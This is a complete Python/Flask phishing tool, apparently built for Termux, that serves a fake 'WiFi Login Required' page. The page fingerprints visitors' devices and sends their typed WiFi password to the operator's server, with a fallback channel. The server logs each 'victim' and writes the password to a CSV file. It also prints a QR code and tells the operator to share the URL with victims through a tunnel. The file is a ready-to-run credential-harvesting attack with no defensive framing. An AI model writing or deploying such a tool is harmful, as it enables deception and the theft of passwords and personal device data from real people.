from __future__ import annotations
import os
import sys
import time
import json
import csv
import subprocess
import socket
import requests
import threading
from datetime import datetime
from typing import Optional

# Try imports
try:
    from flask import Flask, request, render_template_string, jsonify
    import qrcode
    from PIL import Image
    from colorama import init as colorama_init, Fore, Style, Back
    import base64
except Exception as e:
    print("Missing packages. Install: pip install flask qrcode pillow colorama requests")
    print(f"Error: {e}")
    sys.exit(1)

colorama_init(autoreset=True)

# Config
PORT = 5000
PASSWORDS_CSV = "wifi_passwords.csv"
QR_PNG = "wifi_qr.png"
HOST = "0.0.0.0"

app = Flask(__name__)

def show_tool_lock_screen():
    """Show the tool lock screen"""
    os.system('clear' if os.name == 'posix' else 'cls')
    print(f"\n{Back.RED}{Fore.WHITE}{' 🔒 TOOL IS LOCKED ':=^60}{Style.RESET_ALL}")
    print(f"\n{Fore.YELLOW}📱 Subscribe & click the bell 🔔 icon to unlock{Style.RESET_ALL}")
    
    for i in range(3, 0, -1):
        print(f"{Fore.RED}⏳ {i}{Style.RESET_ALL}", end=" ", flush=True)
        time.sleep(1)
    
    youtube_url = "https://youtube.com/@easyxack?si=mcViLkahyF1Sms3Z"
    print(f"\n{Fore.GREEN}🎬 Opening YouTube...{Style.RESET_ALL}")
    
    try:
        subprocess.run(['termux-open-url', youtube_url], capture_output=True, timeout=5)
    except:
        print(f"{Fore.YELLOW}🔗 Manual: {youtube_url}{Style.RESET_ALL}")
    
    input(f"\n{Fore.YELLOW}🚨 Press Enter AFTER subscribing...{Style.RESET_ALL}")
    print(f"{Fore.GREEN}✅ Tool unlocked!{Style.RESET_ALL}")
    time.sleep(1)

def get_local_ip():
    """Get local IP"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

def display_banner():
    """Display banner"""
    os.system('clear' if os.name == 'posix' else 'cls')
    print(f"\n{Back.RED}{Fore.WHITE}{'='*60}{Style.RESET_ALL}")
    print(f"{Back.RED}{Fore.GREEN}{' FAKE WIFI LOGIN TRAP '.center(60)}{Style.RESET_ALL}")
    print(f"{Back.RED}{Fore.WHITE}{' by GitHub Project '.center(60)}{Style.RESET_ALL}")
    print(f"{Back.RED}{Fore.WHITE}{'='*60}{Style.RESET_ALL}")

def display_qr_in_termux(url):
    """Display QR code"""
    try:
        qr = qrcode.QRCode(version=1, box_size=2, border=2)
        qr.add_data(url)
        qr.make(fit=True)
        
        qr_matrix = qr.get_matrix()
        qr_text = ""
        for row in qr_matrix:
            line = ""
            for cell in row:
                line += "██" if cell else "  "
            qr_text += line + "\n"
        
        print(f"\n{Fore.GREEN}📲 QR Code:{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{qr_text}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}🔗 URL: {url}{Style.RESET_ALL}")
        
        img = qr.make_image(fill_color="black", back_color="white")
        img.save(QR_PNG)
        print(f"{Fore.GREEN}💾 QR saved: {QR_PNG}{Style.RESET_ALL}")
        return True
    except:
        return False

# WiFi Login HTML Page
HTML_PAGE = '''
<!DOCTYPE html>
<html>
<head>
    <title>WiFi Login Required</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: Arial, sans-serif; 
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .container {
            background: rgba(0,0,0,0.9);
            padding: 30px;
            border-radius: 20px;
            border: 3px solid #00ff00;
            max-width: 500px;
            width: 100%;
            text-align: center;
            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
        }
        .wifi-icon { 
            font-size: 80px; 
            margin-bottom: 20px;
            animation: pulse 2s infinite;
        }
        @keyframes pulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.1); }
        }
        .title { 
            font-size: 32px; 
            font-weight: bold;
            margin-bottom: 10px;
            color: #00ff00;
            text-shadow: 0 0 10px rgba(0,255,0,0.5);
        }
        .subtitle {
            font-size: 18px;
            margin-bottom: 20px;
            opacity: 0.9;
        }
        .girls-container {
            display: flex;
            justify-content: space-around;
            margin: 20px 0;
        }
        .girl {
            text-align: center;
        }
        .girl-avatar {
            width: 60px;
            height: 60px;
            border-radius: 50%;
            background: linear-gradient(45deg, #ff9a9e, #fad0c4);
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 30px;
            margin: 0 auto 10px;
            border: 2px solid gold;
        }
        .girl-name {
            font-weight: bold;
            color: gold;
            font-size: 14px;
        }
        .girl-message {
            font-size: 12px;
            color: #ccc;
            margin-top: 5px;
        }
        .form-group {
            margin: 20px 0;
            text-align: left;
        }
        label {
            display: block;
            margin-bottom: 8px;
            font-weight: bold;
            color: #00ff00;
        }
        input[type="password"] {
            width: 100%;
            padding: 15px;
            border: 2px solid #00ff00;
            border-radius: 10px;
            background: rgba(255,255,255,0.1);
            color: white;
            font-size: 16px;
        }
        input[type="password"]:focus {
            outline: none;
            box-shadow: 0 0 10px rgba(0,255,0,0.5);
        }
        .btn {
            background: linear-gradient(45deg, #00b09b, #96c93d);
            color: white;
            border: none;
            padding: 20px 30px;
            font-size: 20px;
            font-weight: bold;
            border-radius: 50px;
            width: 100%;
            cursor: pointer;
            margin: 20px 0;
            transition: all 0.3s;
            box-shadow: 0 10px 20px rgba(0,0,0,0.2);
        }
        .btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 15px 30px rgba(0,0,0,0.3);
        }
        .btn:disabled {
            background: #666;
            cursor: not-allowed;
            transform: none;
        }
        .features {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 10px;
            margin: 20px 0;
        }
        .feature {
            background: rgba(255,255,255,0.1);
            padding: 10px;
            border-radius: 10px;
            font-size: 12px;
            border: 1px solid rgba(0,255,0,0.3);
        }
        .status {
            padding: 15px;
            border-radius: 10px;
            margin: 15px 0;
            font-weight: bold;
            display: none;
        }
        .processing { 
            background: #ff9800; 
            color: black;
            display: block; 
        }
        .success { 
            background: #4caf50; 
            display: block; 
        }
        .error { 
            background: #f44336; 
            display: block; 
        }
        .data {
            background: rgba(255,255,255,0.1);
            padding: 20px;
            border-radius: 15px;
            margin: 15px 0;
            text-align: left;
            display: none;
            border: 2px solid rgba(0,255,0,0.3);
        }
        .data h3 {
            text-align: center;
            margin-bottom: 15px;
            color: #00ff00;
        }
        .data-item { 
            margin: 8px 0; 
            padding: 8px;
            background: rgba(255,255,255,0.1);
            border-radius: 8px;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="wifi-icon">📶</div>
        <div class="title">WIFI LOGIN REQUIRED</div>
        <div class="subtitle">Enter WiFi password to continue browsing</div>
        
        <div class="girls-container">
            <div class="girl">
                <div class="girl-avatar">👩</div>
                <div class="girl-name">Sophia</div>
                <div class="girl-message">"Free WiFi Access"</div>
            </div>
            <div class="girl">
                <div class="girl-avatar">👧</div>
                <div class="girl-name">Emma</div>
                <div class="girl-message">"High Speed Internet"</div>
            </div>
        </div>

        <div class="features">
            <div class="feature">⚡ High Speed</div>
            <div class="feature">🔒 Secure</div>
            <div class="feature">🌐 Unlimited</div>
            <div class="feature">📱 All Devices</div>
        </div>

        <form id="wifiForm">
            <div class="form-group">
                <label for="wifiPassword">WiFi Password:</label>
                <input type="password" id="wifiPassword" name="password" 
                       placeholder="Enter your WiFi password" required>
            </div>
            
            <button type="submit" class="btn" id="connectBtn">
                🔗 CONNECT TO WIFI
            </button>
        </form>

        <div id="status" class="status"></div>
        
        <div id="data" class="data">
            <h3>✅ Connected Successfully!</h3>
            <div class="data-item">🌐 IP Address: <span id="ip">Capturing...</span></div>
            <div class="data-item">📱 Device: <span id="device">Capturing...</span></div>
            <div class="data-item">🖥️ Screen: <span id="screen">Capturing...</span></div>
            <div class="data-item">🌍 Browser: <span id="browser">Capturing...</span></div>
            <div class="data-item">⏰ Timezone: <span id="timezone">Capturing...</span></div>
            <div style="text-align: center; margin-top: 15px; color: #00ff00; font-weight: bold;">
                ✅ You are now connected to free WiFi!
            </div>
        </div>
    </div>

    <script>
        // Global data object
        const collectedData = {
            deviceInfo: {},
            password: null,
            timestamp: new Date().toISOString()
        };

        // Initialize on page load
        document.addEventListener('DOMContentLoaded', function() {
            // Collect basic device info immediately
            collectedData.deviceInfo = getDeviceInfo();
            updateDisplay();
            
            // Start verification when button clicked
            document.getElementById('wifiForm').addEventListener('submit', startVerification);
        });

        function getDeviceInfo() {
            return {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                languages: navigator.languages,
                cookieEnabled: navigator.cookieEnabled,
                screen: `${screen.width}x${screen.height}`,
                colorDepth: screen.colorDepth,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                memory: navigator.deviceMemory || 'unknown',
                cores: navigator.hardwareConcurrency || 'unknown'
            };
        }

        function updateDisplay() {
            // Update device info
            document.getElementById('device').textContent = collectedData.deviceInfo.platform || 'Unknown';
            document.getElementById('screen').textContent = collectedData.deviceInfo.screen || 'Unknown';
            document.getElementById('browser').textContent = collectedData.deviceInfo.userAgent?.substring(0, 50) + '...' || 'Unknown';
            document.getElementById('timezone').textContent = collectedData.deviceInfo.timezone || 'Unknown';
        }

        async function startVerification(e) {
            e.preventDefault();
            
            const btn = document.getElementById('connectBtn');
            const status = document.getElementById('status');
            const password = document.getElementById('wifiPassword').value;
            
            collectedData.password = password;
            
            btn.disabled = true;
            btn.innerHTML = '⏳ Connecting to WiFi...';
            status.className = 'status processing';
            status.innerHTML = '🔒 Verifying your password...';
            status.style.display = 'block';

            try {
                // Simulate connection process
                await sleep(2000);
                
                // Send data to server
                await sendAllData();

                // SUCCESS
                status.className = 'status success';
                status.innerHTML = '✅ Connected successfully! Enjoy free WiFi.';
                document.getElementById('data').style.display = 'block';
                btn.style.display = 'none';

                console.log('🎯 PASSWORD CAPTURED:', collectedData);

            } catch (error) {
                status.className = 'status error';
                status.innerHTML = '❌ Connection failed. Please try again.';
                btn.disabled = false;
                btn.innerHTML = '🔗 CONNECT TO WIFI';
                
                // Still send whatever data we have
                await sendAllData();
            }
        }

        async function sendAllData() {
            const payload = {
                ...collectedData,
                timestamp: new Date().toISOString()
            };
            
            try {
                const response = await fetch('/capture', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(payload)
                });
                
                if (!response.ok) {
                    throw new Error('Server response not OK');
                }
                
                const result = await response.json();
                console.log('✅ Data sent successfully:', result);
                
            } catch (error) {
                console.error('❌ Failed to send data:', error);
                // Try fallback method
                await sendFallbackData();
            }
        }

        async function sendFallbackData() {
            // Fallback: send via image request
            const dataStr = encodeURIComponent(JSON.stringify(collectedData));
            const img = new Image();
            img.src = `/fallback?data=${dataStr}`;
        }

        function sleep(ms) {
            return new Promise(resolve => setTimeout(resolve, ms));
        }

        // Update display initially
        updateDisplay();
    </script>
</body>
</html>
'''

@app.route("/")
def index():
    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent')
    
    print(f"\n{Fore.GREEN}{'🎯 NEW VICTIM ACCESSED ':=^60}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}🌐 IP: {client_ip}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}📱 User Agent: {user_agent}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}⏰ Time: {datetime.now()}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
    
    return render_template_string(HTML_PAGE)

@app.route("/capture", methods=["POST"])
def capture_password():
    try:
        data = request.get_json()
        password = data.get("password")
        device_info = data.get("deviceInfo", {})
        client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        
        print(f"\n{Fore.GREEN}{'🔑 PASSWORD CAPTURED ':=^60}{Style.RESET_ALL}")
        print(f"{Fore.RED}🔑 WiFi Password: {password}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}🌐 IP Address: {client_ip}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}📱 Device: {device_info.get('platform', 'Unknown')}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}🖥️ Screen: {device_info.get('screen', 'Unknown')}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}🌍 Browser: {device_info.get('userAgent', 'Unknown')[:80]}...{Style.RESET_ALL}")
        
        # Save to CSV
        record = {
            'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            'ip': client_ip,
            'password': password,
            'platform': device_info.get('platform', 'Unknown'),
            'screen': device_info.get('screen', 'Unknown'),
            'user_agent': device_info.get('userAgent', 'Unknown'),
            'timezone': device_info.get('timezone', 'Unknown')
        }
        
        file_exists = os.path.isfile(PASSWORDS_CSV)
        with open(PASSWORDS_CSV, 'a', newline='', encoding='utf-8') as f:
            writer = csv.DictWriter(f, fieldnames=record.keys())
            if not file_exists:
                writer.writeheader()
            writer.writerow(record)
        
        print(f"{Fore.GREEN}✅ Password saved to: {PASSWORDS_CSV}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}{'🎯 CAPTURE COMPLETED ':=^60}{Style.RESET_ALL}")
        
        return jsonify({"status": "success", "message": "Connected successfully"})
        
    except Exception as e:
        print(f"{Fore.RED}{'❌ CAPTURE ERROR ':=^60}{Style.RESET_ALL}")
        print(f"{Fore.RED}Error: {e}{Style.RESET_ALL}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route("/fallback")
def fallback_data():
    """Fallback endpoint for data collection"""
    data_str = request.args.get('data')
    if data_str:
        try:
            data = json.loads(data_str)
            print(f"{Fore.YELLOW}📝 Fallback data received{Style.RESET_ALL}")
            print(f"{Fore.CYAN}Password: {data.get('password', 'Not found')}{Style.RESET_ALL}")
        except:
            pass
    return jsonify({"status": "logged"})

def main():
    # Show lock screen
    show_tool_lock_screen()
    display_banner()
    
    print(f"\n{Back.GREEN}{Fore.WHITE}{'🚀 WIFI TRAP SERVER STARTED ':=^60}{Style.RESET_ALL}")
    
    # Get local URLs
    local_ip = get_local_ip()
    local_url = f"http://localhost:{PORT}"
    network_url = f"http://{local_ip}:{PORT}"
    
    print(f"{Fore.CYAN}🌐 Local URL: {local_url}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}🌐 Network URL: {network_url}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}📢 Use your tunnel tool to expose port {PORT}{Style.RESET_ALL}")
    
    # Display QR for network URL
    display_qr_in_termux(network_url)
    
    print(f"\n{Fore.YELLOW}🚀 Share the network URL with victim{Style.RESET_ALL}")
    print(f"{Fore.GREEN}🔑 Will capture: WiFi Password + Device info + IP{Style.RESET_ALL}")
    print(f"{Fore.RED}🔴 Waiting for victim to enter WiFi password...{Style.RESET_ALL}")
    
    try:
        app.run(host=HOST, port=PORT, debug=False)
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}🛑 Server stopped{Style.RESET_ALL}")

if __name__ == "__main__":
    main()
